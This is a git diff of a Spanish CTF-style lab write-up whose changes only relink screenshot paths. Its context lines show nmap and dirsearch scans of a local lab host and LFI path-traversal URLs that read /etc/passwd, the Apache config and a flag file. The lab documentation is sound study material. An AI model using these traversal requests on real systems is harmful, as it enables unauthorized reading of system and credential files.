@@ -30,16 +30,16 @@ El impacto es crítico, ya que este vector de ataque no solo permite la lectura 
 sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvvv -n -Pn 172.17.0.2
 ```
 - **Puertos abiertos:** 80.
-- **Evidencias:** > [!info] Resultado Nmap > ![[Pasted image 20260419112255.png]]
+- **Evidencias:** > [!info] Resultado Nmap > ![[../../../04_Assets (Imágenes o Capturas)/image20260419112255.png]]
 ### Enumeración Web
 ```
 dirsearch -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -e all
 ```
 
 - **Tecnologías:** [[Apache HTTP Server]], [[PHP]].
-	- ![[Pasted image 20260419113121.png]]
+	- ![[../../../04_Assets (Imágenes o Capturas)/image20260419113121.png]]
 - **Directorias hallados:** `/server-status.
-	- ![[Pasted image 20260419112746.png]]
+	- ![[../../../04_Assets (Imágenes o Capturas)/image20260419112746.png]]
 	
 ---
 ## 4. Análisis y Explotación
@@ -49,13 +49,13 @@ dirsearch -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -e all
 sudo nmap $TARGET -p 80 -sV --script vuln
 ```
 - El análisis muestra un servidor Apache 2.4.54 en Debian con múltiples vulnerabilidades críticas (CVSS 9.8), incluyendo RCE (CVE-2024-38476, CVE-2024-38474) y Request Smuggling (CVE-2023-25690). El vector de entrada principal es la explotación de estos fallos conocidos mediante exploits públicos listados en el reporte.
-![[Pasted image 20260419114933.png]]
+![[../../../04_Assets (Imágenes o Capturas)/image20260419114933.png]]
 - Se observa posible vulnerabilidad LFI en la ruta
-	- ![[Pasted image 20260419121409.png]]
+	- ![[../../../04_Assets (Imágenes o Capturas)/image20260419121409.png]]
 	- http://172.17.0.2/?page=../../../../etc/passwd
-	- ![[Pasted image 20260419122022.png]]
+	- ![[../../../04_Assets (Imágenes o Capturas)/image20260419122022.png]]
 	- http://172.17.0.2/?page=../../../../etc/apache2/apache2.conf
-	- ![[Pasted image 20260419123241.png]]
+	- ![[../../../04_Assets (Imágenes o Capturas)/image20260419123241.png]]
 	
 	- **Permiso en `/var/www/`**: Aquí es donde vive la web. El archivo dice que en esa carpeta **sí** se permite ver contenido (`Require all granted`).
 	
@@ -64,7 +64,7 @@ sudo nmap $TARGET -p 80 -sV --script vuln
 ### Post-Explotación
 - Técnica utilizada [[LFI]] 
 - http://172.17.0.2/?page=../flag.txt
-- ![[Pasted image 20260419123856.png]]
+- ![[../../../04_Assets (Imágenes o Capturas)/image20260419123856.png]]
 
 
 ### Captura de Flag
